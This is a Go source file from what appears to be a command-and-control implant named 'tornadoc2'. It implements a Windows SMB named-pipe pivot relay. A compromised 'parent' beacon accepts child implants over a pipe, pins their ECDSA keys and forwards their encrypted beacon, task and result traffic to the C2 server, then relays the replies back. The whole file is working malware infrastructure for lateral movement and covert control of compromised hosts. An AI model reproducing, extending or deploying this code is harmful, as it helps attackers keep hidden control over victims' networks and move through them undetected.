//go:build windows

package core

import (
	"crypto/ecdsa"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"sync"
	"time"

	"golang.org/x/sys/windows"

	"tornadoc2/agent/internal/pivot"
)

type smbRelay struct {
	pipeName     string
	parent       *Agent
	pivotPrivKey *ecdsa.PrivateKey

	mu         sync.Mutex
	listenH    windows.Handle
	stopped    bool
	stopCh     chan struct{}
	pinnedKeys map[string]*ecdsa.PublicKey
}

func newSMBRelay(parent *Agent, pipeName string,
	pivotPrivKey *ecdsa.PrivateKey) (*smbRelay, error) {

	if pipeName == "" {
		return nil, errors.New(
			"smb pivot: --smb-relay-pipe is empty")
	}
	for _, ch := range pipeName {
		ok := (ch >= 'a' && ch <= 'z') ||
			(ch >= 'A' && ch <= 'Z') ||
			(ch >= '0' && ch <= '9') ||
			ch == '.' || ch == '_' || ch == '-'
		if !ok {
			return nil, fmt.Errorf(
				"smb pivot: --smb-relay-pipe must be a "+
					"bare name (letters, digits, '.', '_', "+
					"'-'); got %q",
				pipeName)
		}
	}
	return &smbRelay{
		pipeName:     `\\.\pipe\` + pipeName,
		parent:       parent,
		pivotPrivKey: pivotPrivKey,
		listenH:      windows.InvalidHandle,
		stopCh:       make(chan struct{}),
		pinnedKeys:   map[string]*ecdsa.PublicKey{},
	}, nil
}

func (r *smbRelay) start() error {
	if r.pivotPrivKey == nil {
		return errors.New(
			"smb pivot: pivot private key not configured")
	}
	h, err := createPipeInstance(r.pipeName)
	if err != nil {
		return err
	}
	r.mu.Lock()
	r.listenH = h
	r.mu.Unlock()
	go r.acceptLoop()
	return nil
}

func createPipeInstance(name string) (windows.Handle, error) {
	p, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return windows.InvalidHandle, err
	}
	return windows.CreateNamedPipe(
		p,
		windows.PIPE_ACCESS_DUPLEX|windows.FILE_FLAG_OVERLAPPED,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		255, // max instances
		65536, 65536, 0, nil,
	)
}

func (r *smbRelay) stop() {
	r.mu.Lock()
	if r.stopped {
		r.mu.Unlock()
		return
	}
	r.stopped = true
	close(r.stopCh)
	h := r.listenH
	r.listenH = windows.InvalidHandle
	r.mu.Unlock()
	if h != windows.InvalidHandle {
		windows.CloseHandle(h)
	}
}

func (r *smbRelay) lookupChildKey(fp string) (*ecdsa.PublicKey, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	k, ok := r.pinnedKeys[fp]
	return k, ok
}

const maxPinnedKeys = 4096

func (r *smbRelay) pinChildKey(fp string, k *ecdsa.PublicKey) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	if existing, ok := r.pinnedKeys[fp]; ok {
		return existing.Equal(k)
	}
	if len(r.pinnedKeys) >= maxPinnedKeys {
		diag("[beacon] smb pivot: pin table full "+
			"(%d entries); refusing new fingerprint %s\n",
			maxPinnedKeys, fp[:8])
		return false
	}
	r.pinnedKeys[fp] = k
	return true
}

func (r *smbRelay) acceptLoop() {
	for {
		select {
		case <-r.stopCh:
			return
		default:
		}

		r.mu.Lock()
		h := r.listenH
		r.mu.Unlock()
		if h == windows.InvalidHandle {
			return
		}

		err := windows.ConnectNamedPipe(h, nil)
		if err != nil && err != windows.ERROR_PIPE_CONNECTED {
			select {
			case <-r.stopCh:
				return
			case <-time.After(time.Second):
			}
			continue
		}

		go r.serve(h)

		newH, err := createPipeInstance(r.pipeName)
		if err != nil {
			diag("[beacon] smb pivot: new instance: %v\n", err)
			r.mu.Lock()
			r.listenH = windows.InvalidHandle
			r.mu.Unlock()
			return
		}
		r.mu.Lock()
		if r.stopped {
			r.mu.Unlock()
			windows.CloseHandle(newH)
			return
		}
		r.listenH = newH
		r.mu.Unlock()
	}
}

type parentPipeIO struct {
	h windows.Handle
}

func (f *parentPipeIO) WriteFrame(body []byte) error {
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(body)))
	if err := overlappedWrite(f.h, lenBuf[:]); err != nil {
		return err
	}
	return overlappedWrite(f.h, body)
}

func (f *parentPipeIO) ReadFrame() ([]byte, error) {
	var lenBuf [4]byte
	if err := readFullOverlapped(f.h, lenBuf[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > 16*1024*1024 {
		return nil, fmt.Errorf("invalid frame length %d", n)
	}
	buf := make([]byte, n)
	if err := readFullOverlapped(f.h, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func (r *smbRelay) serve(h windows.Handle) {
	defer func() {
		windows.DisconnectNamedPipe(h)
		windows.CloseHandle(h)
	}()

	fio := &parentPipeIO{h: h}

	result, err := pivot.ParentVerifyAndRespond(
		fio, r.pivotPrivKey)
	if err != nil {
		diag("[beacon] smb pivot: handshake: %v\n", err)
		return
	}

	if existing, ok := r.lookupChildKey(result.Fingerprint); ok {
		if !existing.Equal(result.PubKey) {
			diag("[beacon] smb pivot: fingerprint %s presented "+
				"a different public key\n",
				result.Fingerprint[:8])
			return
		}
	} else {
		if !r.pinChildKey(result.Fingerprint, result.PubKey) {
			return
		}
		diag("[beacon] smb pivot: pinned child %s (TOFU)\n",
			result.Fingerprint[:8])
	}

	diag("[beacon] smb pivot: child %s connected\n",
		result.Fingerprint[:8])
	defer diag("[beacon] smb pivot: child %s disconnected\n",
		result.Fingerprint[:8])

	sess := result.Session
	defer sess.Close()
	for {
		select {
		case <-r.stopCh:
			return
		default:
		}

		rawFrame, err := fio.ReadFrame()
		if err != nil {
			return
		}
		frame, err := pivot.DecodeFrame(rawFrame)
		if err != nil {
			diag("[beacon] smb pivot: bad frame: %v\n", err)
			return
		}
		plaintext, err := sess.DecryptChildToParent(frame)
		_ = frame
		if err != nil {
			diag("[beacon] smb pivot: decrypt: %v\n", err)
			return
		}
		var env struct {
			Op   string          `json:"op"`
			Body json.RawMessage `json:"body"`
		}
		if err := json.Unmarshal(plaintext, &env); err != nil {
			diag("[beacon] smb pivot: bad envelope: %v\n", err)
			return
		}
		var path string
		switch env.Op {
		case "beacon":
			path = r.parent.profile.BeaconPath
		case "tasks":
			path = r.parent.profile.TasksPath
		case "results":
			path = r.parent.profile.ResultsPath
		}
		if path == "" {
			diag("[beacon] smb pivot: unknown op %q "+
				"(parent profile has no path for this op)\n",
				env.Op)
			return
		}

		// The child's body is a wire envelope, not a shaped
		// body. The parent has no key for the child's wire
		// session, so it cannot open the envelope, cannot see
		// the shaped body inside it, and cannot wrap or
		// unwrap the shape on the child's behalf. Every byte
		// in both directions is forwarded verbatim; the child
		// does its own wire decryption and shape unwrap
		// against the profile it was built with.
		serverBody, status, relayErr := r.parent.relayPost(
			path, env.Body, result.Fingerprint, env.Op)
		if relayErr != nil || status < 200 || status >= 300 {
			errMsg := fmt.Sprintf("status %d", status)
			if relayErr != nil {
				errMsg = relayErr.Error()
			}
			diag("[beacon] smb pivot: relay: %s\n", errMsg)

			errReply, _ := json.Marshal(struct {
				Status int    `json:"status"`
				Error  string `json:"error"`
			}{Status: status, Error: errMsg})
			if respFrame, encErr :=
				sess.EncryptParentToChild(errReply); encErr == nil {
				if respBytes, encErr :=
					pivot.EncodeFrame(respFrame); encErr == nil {
					_ = fio.WriteFrame(respBytes)
				}
			}
			return
		}

		// Same rationale on the way back: the server's
		// response body is a wire envelope addressed to the
		// child. Forward it verbatim.

		wrapped, err := json.Marshal(struct {
			Body json.RawMessage `json:"body"`
		}{
			Body: json.RawMessage(serverBody),
		})
		if err != nil {
			return
		}

		respFrame, err := sess.EncryptParentToChild(wrapped)
		if err != nil {
			return
		}
		respBytes, err := pivot.EncodeFrame(respFrame)
		if err != nil {
			return
		}
		if err := fio.WriteFrame(respBytes); err != nil {
			return
		}
	}
}

const pipeDeadline = 30 * time.Second

func overlappedRead(h windows.Handle, p []byte) (int, error) {
	ev, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(ev)

	var ov windows.Overlapped
	ov.HEvent = ev

	var n uint32
	err = windows.ReadFile(h, p, &n, &ov)
	if err == windows.ERROR_IO_PENDING {
		waitMS := uint32(pipeDeadline / time.Millisecond)
		w, werr := windows.WaitForSingleObject(ev, waitMS)
		if werr != nil {
			windows.CancelIoEx(h, &ov)
			return 0, werr
		}
		if w == uint32(windows.WAIT_TIMEOUT) {
			windows.CancelIoEx(h, &ov)
			return 0, fmt.Errorf(
				"pipe read: timeout after %v", pipeDeadline)
		}
		err = windows.GetOverlappedResult(h, &ov, &n, false)
	}
	if err != nil {
		if err == windows.ERROR_BROKEN_PIPE ||
			err == windows.ERROR_HANDLE_EOF ||
			err == windows.ERROR_OPERATION_ABORTED {
			if n == 0 {
				return 0, io.EOF
			}
			return int(n), nil
		}
		return int(n), err
	}
	if n == 0 {
		return 0, io.EOF
	}
	return int(n), nil
}

func overlappedWrite(h windows.Handle, buf []byte) error {
	for len(buf) > 0 {
		ev, err := windows.CreateEvent(nil, 0, 0, nil)
		if err != nil {
			return err
		}
		var ov windows.Overlapped
		ov.HEvent = ev

		var n uint32
		err = windows.WriteFile(h, buf, &n, &ov)
		if err == windows.ERROR_IO_PENDING {
			waitMS := uint32(pipeDeadline / time.Millisecond)
			w, werr := windows.WaitForSingleObject(ev, waitMS)
			if werr != nil {
				windows.CancelIoEx(h, &ov)
				windows.CloseHandle(ev)
				return werr
			}
			if w == uint32(windows.WAIT_TIMEOUT) {
				windows.CancelIoEx(h, &ov)
				windows.CloseHandle(ev)
				return fmt.Errorf(
					"pipe write: timeout after %v",
					pipeDeadline)
			}
			err = windows.GetOverlappedResult(h, &ov, &n, false)
		}
		windows.CloseHandle(ev)
		if err != nil {
			return err
		}
		if n == 0 {
			return errors.New(
				"smb: pipe write returned 0 bytes")
		}
		buf = buf[n:]
	}
	return nil
}

func readFullOverlapped(h windows.Handle, buf []byte) error {
	off := 0
	for off < len(buf) {
		n, err := overlappedRead(h, buf[off:])
		off += n
		if err != nil {
			if err == io.EOF && off == len(buf) {
				return nil
			}
			return err
		}
	}
	return nil
}